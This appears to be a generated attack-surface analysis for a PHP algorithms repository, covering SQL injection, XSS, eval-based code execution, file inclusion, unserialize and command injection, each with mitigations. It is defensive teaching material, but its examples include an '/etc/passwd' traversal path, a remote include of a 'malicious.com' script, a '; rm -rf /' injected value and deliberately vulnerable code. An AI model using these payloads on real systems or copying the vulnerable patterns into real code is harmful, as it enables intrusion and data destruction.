# Attack Surface Analysis for thealgorithms/php

## Attack Surface: [SQL Injection](./attack_surfaces/sql_injection.md)

* **Description:**  An attacker can inject malicious SQL queries into an application's database queries, potentially leading to data breaches, modification, or deletion.
    * **How PHP Contributes:**  PHP's direct interaction with databases through extensions like `mysqli` and `PDO`, combined with the common practice of directly embedding user input into SQL queries without proper sanitization or using parameterized queries, creates this vulnerability.
    * **Example:**
        * A login form where the username is directly inserted into the SQL query: `SELECT * FROM users WHERE username = '$_GET[username]' AND password = '...';`
    * **Impact:**  Critical. Can lead to complete database compromise, including sensitive user data, financial information, and more.
    * **Risk Severity:** Critical
    * **Mitigation Strategies:**
        * Use Parameterized Queries (Prepared Statements): This is the primary defense. It separates SQL code from user-provided data, preventing interpretation of the data as code.
        * Input Validation and Sanitization: While not a replacement for parameterized queries, validate and sanitize user input to remove potentially harmful characters.
        * Principle of Least Privilege for Database Users: Grant database users only the necessary permissions.
        * Escape Output (for display, not for queries): Escape data retrieved from the database before displaying it to prevent secondary injection issues.

## Attack Surface: [Cross-Site Scripting (XSS) - Focusing on PHP's role in generating vulnerable output](./attack_surfaces/cross-site_scripting__xss__-_focusing_on_php's_role_in_generating_vulnerable_output.md)

* **Description:**  Attackers inject malicious scripts (usually JavaScript) into web pages viewed by other users.
    * **How PHP Contributes:** PHP is responsible for generating the HTML output. If PHP code directly outputs user-provided data without proper encoding, it can embed malicious scripts into the page.
    * **Example:**
        * Displaying a user's comment directly: `echo "<div>" . $_GET['comment'] . "</div>";`  If `$_GET['comment']` contains `<script>alert('XSS')</script>`, it will execute in the user's browser.
    * **Impact:** High. Can lead to session hijacking, cookie theft, redirection to malicious sites, and defacement.
    * **Risk Severity:** High
    * **Mitigation Strategies:**
        * Output Encoding/Escaping: Encode user-provided data before displaying it in HTML. Use context-aware encoding functions like `htmlspecialchars()` for HTML content, `urlencode()` for URLs, and `json_encode()` for JSON.
        * Content Security Policy (CSP): Implement CSP headers to control the sources from which the browser is allowed to load resources, reducing the impact of injected scripts.
        * Template Engines with Auto-Escaping: Utilize template engines that automatically escape output by default.

## Attack Surface: [Remote Code Execution (RCE) via `eval()` and similar functions](./attack_surfaces/remote_code_execution__rce__via__eval____and_similar_functions.md)

* **Description:**  Attackers can execute arbitrary code on the server.
    * **How PHP Contributes:**  PHP functions like `eval()`, `assert()` with string arguments, `create_function()`, and `preg_replace()` with the `/e` modifier allow the execution of dynamically generated code. If attacker-controlled input reaches these functions, they can inject and execute arbitrary PHP code.
    * **Example:**
        * `eval($_GET['code']);` - Directly executing code provided in the URL.
    * **Impact:** Critical. Complete compromise of the server, allowing attackers to steal data, install malware, or pivot to other systems.
    * **Risk Severity:** Critical
    * **Mitigation Strategies:**
        * Avoid `eval()` and Similar Functions: These functions should be avoided entirely unless absolutely necessary and the input is strictly controlled and trusted (which is rarely the case with user input).
        * Input Validation and Sanitization (Strict): If dynamic code execution is unavoidable, implement extremely strict validation and sanitization to ensure only expected and safe code is executed. This is highly complex and error-prone.
        * Principle of Least Privilege: Run PHP processes with minimal necessary privileges.

## Attack Surface: [Local File Inclusion (LFI)](./attack_surfaces/local_file_inclusion__lfi_.md)

* **Description:**  Attackers can include arbitrary files from the server's filesystem within the application.
    * **How PHP Contributes:**  PHP functions like `include`, `require`, `include_once`, and `require_once`, when used with user-controlled paths, can be exploited to include sensitive files.
    * **Example:**
        * `include($_GET['page'] . ".php");` - Allowing users to specify the page to include. An attacker could use `../../../../etc/passwd` to access sensitive system files.
    * **Impact:** High. Can lead to disclosure of sensitive information (source code, configuration files, credentials), and in some cases, remote code execution if combined with other vulnerabilities (e.g., log poisoning).
    * **Risk Severity:** High
    * **Mitigation Strategies:**
        * Avoid User-Controlled Paths in File Inclusion: Never directly use user input to determine the path of files to be included.
        * Whitelist Allowed Files: If dynamic inclusion is necessary, maintain a strict whitelist of allowed files and only include files from that list.
        * Sanitize Input (with extreme caution): While sanitization can help, it's difficult to prevent all path traversal attempts. Whitelisting is preferred.
        * `open_basedir` Restriction: Configure the `open_basedir` PHP setting to restrict the files that PHP can access.

## Attack Surface: [Remote File Inclusion (RFI)](./attack_surfaces/remote_file_inclusion__rfi_.md)

* **Description:**  Attackers can include files from remote servers within the application.
    * **How PHP Contributes:**  PHP's configuration option `allow_url_fopen` (and similar settings) allows file functions to retrieve content from remote URLs. If this is enabled and user input controls the URL, attackers can include malicious scripts from external sources.
    * **Example:**
        * `include($_GET['file']);` where `$_GET['file']` could be `http://malicious.com/evil.php`.
    * **Impact:** Critical. Direct remote code execution as the included file will be executed on the server.
    * **Risk Severity:** Critical
    * **Mitigation Strategies:**
        * Disable `allow_url_fopen`:** This is the most effective mitigation. Disable this setting in `php.ini` unless absolutely necessary.
        * Strict Whitelisting (if RFI is absolutely required): If remote file inclusion is unavoidable, maintain a very strict whitelist of trusted remote sources. This is highly discouraged due to the inherent risks.
        * Input Validation (for URLs): Thoroughly validate and sanitize URLs if they are used in file inclusion functions.

## Attack Surface: [Unserialize Vulnerabilities (Object Injection)](./attack_surfaces/unserialize_vulnerabilities__object_injection_.md)

* **Description:**  Attackers can manipulate serialized PHP objects and inject arbitrary objects into the application's scope during unserialization.
    * **How PHP Contributes:**  The `unserialize()` function in PHP reconstructs objects from a serialized string. If untrusted data is unserialized, attackers can craft malicious serialized strings that instantiate arbitrary classes and trigger their magic methods (e.g., `__wakeup`, `__destruct`), potentially leading to code execution or other malicious actions.
    * **Example:**
        * An application stores serialized objects in a cookie or database and unserializes them later. An attacker could manipulate the serialized string to inject a malicious object.
    * **Impact:** High to Critical. Can lead to remote code execution, privilege escalation, or denial of service depending on the classes available in the application.
    * **Risk Severity:** High (can be Critical)
    * **Mitigation Strategies:**
        * Avoid Unserializing Untrusted Data: The primary defense is to avoid unserializing data from untrusted sources.
        * Input Validation and Sanitization (of serialized data): If unserialization of external data is necessary, implement strict validation and sanitization of the serialized string before unserializing. This is complex and difficult to do securely.
        * Use `__wakeup()` and `__destruct()` Carefully: Ensure these magic methods do not perform dangerous actions based on object properties that could be manipulated during unserialization.
        * Consider Alternative Data Serialization Formats: Use safer data serialization formats like JSON if possible.

## Attack Surface: [Command Injection](./attack_surfaces/command_injection.md)

* **Description:**  Attackers can execute arbitrary system commands on the server.
    * **How PHP Contributes:**  PHP functions like `system()`, `exec()`, `shell_exec()`, `passthru()`, and `proc_open()` allow the execution of operating system commands. If user-supplied data is passed to these functions without proper sanitization, attackers can inject malicious commands.
    * **Example:**
        * `system("ping -c 4 " . $_GET['host']);` - An attacker could provide `; rm -rf /` as the host.
    * **Impact:** Critical. Complete compromise of the server, allowing attackers to perform any action the web server user has permissions for.
    * **Risk Severity:** Critical
    * **Mitigation Strategies:**
        * Avoid System Calls: The best defense is to avoid making system calls whenever possible. Find alternative PHP functions or libraries to achieve the desired functionality.
        * Input Validation and Sanitization (Strict Whitelisting): If system calls are unavoidable, implement extremely strict input validation and sanitization. Whitelist allowed characters or patterns for command parameters.
        * Use Escaping Functions: Use PHP's escaping functions (e.g., `escapeshellarg()`, `escapeshellcmd()`) to properly escape arguments passed to shell commands. However, these functions have limitations and should be used with caution.
        * Principle of Least Privilege: Run the web server process with minimal necessary privileges.
